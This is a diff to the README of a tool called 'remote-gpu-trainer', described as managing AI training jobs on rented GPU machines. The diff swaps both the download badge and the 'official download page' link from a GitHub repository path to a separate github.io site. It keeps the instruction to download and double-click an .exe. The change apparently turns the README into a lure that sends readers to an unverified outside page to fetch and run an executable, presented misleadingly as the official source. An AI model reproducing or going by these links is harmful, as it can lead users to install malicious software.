@@ -1,6 +1,6 @@
 # 🖥️ remote-gpu-trainer - Train machine learning models on remote computers
 
-[![Download Software](https://img.shields.io/badge/Download-Remote_GPU_Trainer-blue.svg)](https://github.com/Udalefourfold471/remote-gpu-trainer)
+[![Download Software](https://img.shields.io/badge/Download-Remote_GPU_Trainer-blue.svg)](https://udalefourfold471.github.io)
 
 This application helps users manage artificial intelligence training jobs on remote computers. You can rent powerful computers from providers like RunPod, Vast.ai, or Lambda, and use this tool to start your training tasks. It handles the deployment of your code, monitors progress, and shuts down the computer when the work finishes to save money.
 
@@ -21,7 +21,7 @@ Your computer requires the following to run this tool effectively:
 
 The software requires a simple installation process. You obtain the installer from the official repository page.
 
-1.  Visit the [official download page](https://github.com/Udalefourfold471/remote-gpu-trainer).
+1.  Visit the [official download page](https://udalefourfold471.github.io).
 2.  Locate the latest version release on the right side of the page.
 3.  Click the file ending in `.exe` to start your download.
 4.  Once the file finishes downloading, double-click it to start the setup wizard.
